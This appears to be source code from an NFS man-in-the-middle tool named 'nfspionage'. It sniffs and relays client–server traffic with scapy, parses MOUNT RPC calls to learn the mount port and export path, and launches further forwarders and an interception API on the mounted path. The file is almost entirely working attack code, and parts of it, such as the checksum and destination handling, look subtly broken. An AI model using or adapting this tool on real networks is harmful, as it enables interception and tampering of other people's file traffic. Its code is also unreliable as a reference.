import _thread
import ipaddress
import socket

from nfspionage_api import NfspionageApi
from scapy.compat import raw
from scapy.contrib.mount import MOUNT_Call
from scapy.contrib.oncrpc import RPC
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, sr1
from scapy.supersocket import StreamSocket


# @PARAM
# packet        scapy       packet object
# protocol      string      TCP, UDP
# dir           bool
def print_ip_addr(packet, protocol=TCP, src=False):
	if IP in packet:
		if src:
			return packet[IP].src + ":" + str(packet[protocol].sport)
		else:
			return packet[IP].dst + ":" + str(packet[protocol].dport)


def protocol_str(protocol):
	if protocol == TCP:
		return "tcp"
	else:
		return "udp"


def print_packet_transfer(protocol, packet):
	print("[+ " + protocol_str(protocol).upper() + " ] " + print_ip_addr(packet, src=True) + " >>> " + print_ip_addr(packet, src=False) + " [" + str(len(packet)) + "]")


def tuple_to_addr(address):
	return str(address[0]) + ":" + str(address[1])


'''
# ==============================================================================
# MITM FORWARDER ===============================================================
# ==============================================================================
'''


class MitmForwarder:
	server_address = None
	spoof_address = None
	target_port = None

	client_address = None
	mount_ports = []

	def __init__(self, remote_ip, port, udp=False):
		self.server_address = remote_ip
		self.target_port = port
		self.spoof_address = remote_ip
		print("// ========================================")
		print("// Starting MitmForwarder...")
		print("// [*] LOC Addr:\t127.0.0.1:" + str(port))
		print("// [*] REM Addr:\t" + remote_ip + ":" + str(port))
		if udp:
			print("// [*] PROT:\t\tUDP")
			self.udp_proxy()
		else:
			print("// [*] PROT:\t\tTCP")
			self.tcp_proxy()
		print("// ========================================")

	def update_client_address(self, packet):
		if packet[IP].src is not self.server_address:
			self.client_address = packet[IP].src

	# ==================== TCP FORWARDING ==================== #

	# create tcp servers to listen for and forward connections to target
	def tcp_proxy(self):
		str_filter = "tcp and port " + str(self.target_port)
		sniff(filter=str_filter, prn=self.transfer_tcp)

	# server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	# server_socket.bind(('', self.target_port))
	# server_socket = StreamSocket(server_socket)
	#
	# while True:
	# 	# accept connection from client
	# 	local_socket, local_address = server_socket.recv()
	# 	self.update_spoof_address(local_address[0])
	#
	# 	# create remote socket to connect to server
	# 	remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# 	remote_socket.bind(('', local_address[1]))
	# 	remote_socket.connect((self.server_address, self.target_port))
	# 	remote_socket = StreamSocket(remote_socket)
	#
	# 	# create threads for each direction
	# 	s = threading.Thread(target=self.transfer_tcp, args=(remote_socket, local_socket))
	# 	r = threading.Thread(target=self.transfer_tcp, args=(local_socket, remote_socket))
	# 	s.start()
	# 	r.start()

	def transfer_tcp(self, pkt):
		if IP in pkt:  # only process packets with IP layer
			pkt[IP].checksum = None  # ask scapy to regenerate it
			if Ether in pkt:
				pkt[Ether].checksum = None  # ask scapy to regenerate it
			print_packet_transfer(TCP, pkt)
			self.update_client_address(pkt)
			if pkt[IP].src != self.server_address:  # packet is NOT from server -> forward to target
				pkt.dst = hex(int(ipaddress.IPv4Address(self.server_address)))
				print("\t - forwarding to " + str(self.server_address))
			else:  # packets is from server -> forward to client
				pkt.dst = hex(int(ipaddress.IPv4Address(self.client_address)))
				print("\t - forwarding to " + str(self.client_address))
			sr1(pkt)

	# listens for tcp connections and forwards data from src socket to dst socket
	# @staticmethod
	# def transfer_tcp(src, dst):
	# 	while True:
	# 		data = src.recv(64512)
	# 		print("[+ TCP ] " + tuple_to_addr(src.getpeername()) + " >>> " + tuple_to_addr(dst.getpeername()) + " [" + str(len(data)) + "]")
	# 		dst.send(data)

	# ==================== UDP FORWARDING ==================== #

	# create udp servers to listen for and forward connections to target
	def udp_proxy(self):
		# create socket to listen for connection from client
		proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		proxy_socket.bind(('', self.target_port))
		proxy_socket = StreamSocket(proxy_socket)

		# create address variables
		server_address = (self.server_address, int(self.target_port))
		client_address = None

		while True:
			data, address = proxy_socket.recvfrom(65412)
			self.filter_packets(data, self.server_address)

			#  create spoof socket to send packets from
			spoof_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			spoof_socket.bind(('', address[1]))
			spoof_socket = StreamSocket(spoof_socket)

			if client_address is None:
				client_address = address
			# client addr, send to server (listen on spoof socket for resp)
			if address == client_address:
				print(
					"[+ UDP ] " + tuple_to_addr(client_address) + " >>> " + tuple_to_addr(server_address) + " [" + str(
						len(data)) + "]")
				spoof_socket.sendto(data, server_address)
				self.udp_listen(spoof_socket, proxy_socket)
			# server addr, send to client
			elif address == server_address:

				print(
					"[+ UDP ] " + tuple_to_addr(server_address) + " >>> " + tuple_to_addr(client_address) + " [" + str(
						len(data)) + "]")
				proxy_socket.sendto(data, client_address)
				client_address = None
			# unknown addr, send to server
			else:
				print(
					"[+ UDP ] " + tuple_to_addr(server_address) + " >>> " + tuple_to_addr(client_address) + " [" + str(
						len(data)) + "]")
				proxy_socket.sendto(data, client_address)
				client_address = None

	@staticmethod
	def udp_listen(src, dst):
		data, address = src.recv(65412)
		dst.send(data)

	# # ==================== PACKET FORWARDING ==================== #
	#
	# # create tcp servers to listen for and forward connections to target
	# def packet_listen(self, protocol):
	# 	# socket to actually accept connections on localhost:target_port
	# 	if protocol == TCP:
	# 		server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# 	else:
	# 		server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	# 	print("[* INF ] starting " + protocol_str(protocol) + " socket on port " + str(self.target_port))
	# 	server_socket.bind(('', self.target_port))
	# 	stream_socket = StreamSocket(server_socket)
	#
	# 	while True:
	# 		print("===========================================")
	#
	# 		packet_filter_str = protocol_str(protocol) + " and port " + str(self.target_port)
	# 		pkt = stream_socket.sniff(count=0, filter=packet_filter_str)[0]
	# 		print("pkt: " + str(pkt))
	#
	# 		if IP in pkt:  # only process packets with IP layer
	# 			pkt[IP].checksum = None  # ask scapy to regenerate it
	# 			if Ether in pkt:
	# 				pkt[Ether].checksum = None  # ask scapy to regenerate it
	# 			print_packet_transfer(TCP, pkt)
	# 			self.update_client_address(pkt)
	# 			if pkt[IP].src != self.server_address:  # packet is NOT from server -> forward to target
	# 				pkt.dst = hex(int(ipaddress.IPv4Address(self.server_address)))
	# 				print("\t - forwarding to " + str(self.server_address))
	# 			else:  # packets is from server -> forward to client
	# 				pkt.dst = hex(int(ipaddress.IPv4Address(self.client_address)))
	# 				print("\t - forwarding to " + str(self.client_address))
	# 			stream_socket.send(pkt)
	# 		print("===========================================")

	# ==================== PACKET FILTERING ==================== #

	# filter packets for data of interest - i.e., mount port and mount path
	def filter_packets(self, data, remote_ip):
		port = self.filter_mount_port(data)
		if port != -1 and port not in self.mount_ports:
			print("[* INF ] starting forwarders on port " + str(port))
			_thread.start_new_thread(MitmForwarder, (remote_ip, port))
			_thread.start_new_thread(MitmForwarder, (remote_ip, port, True))
			self.mount_ports.append(port)

		# filter path, start mitm API
		path = self.filter_mount_path(data)
		if path != -1:
			print("[* INF ] starting NFS MITM API on path \'" + path + "\'")
			_thread.start_new_thread(NfspionageApi, (remote_ip, path))

	@staticmethod
	def filter_mount_port(data):
		try:  # get port number from last few bytes
			sz = len(data)
			x = data[sz - 2:sz]
			tmp = x.hex()
			port = int(tmp, 16)

			if port != 0 and port > 100:
				print("[* INF ] MOUNT on port " + str(port))
				return port
			else:
				return -1
		except Exception as e:  # error getting mount port
			str("[- EXP ] " + str(e))
			return -1

	@staticmethod
	def filter_mount_path(data):
		try:  # try to convert to MOUNT_Call packet
			mnt_pckt = RPC(MOUNT_Call(raw(data)))
			path = mnt_pckt.path.path.decode('utf-8')
			print("[* INF ] MOUNT on path " + path)
			return path
		except Exception as e:  # error getting mount path
			print("[- EXP ] " + str(e))
			return -1
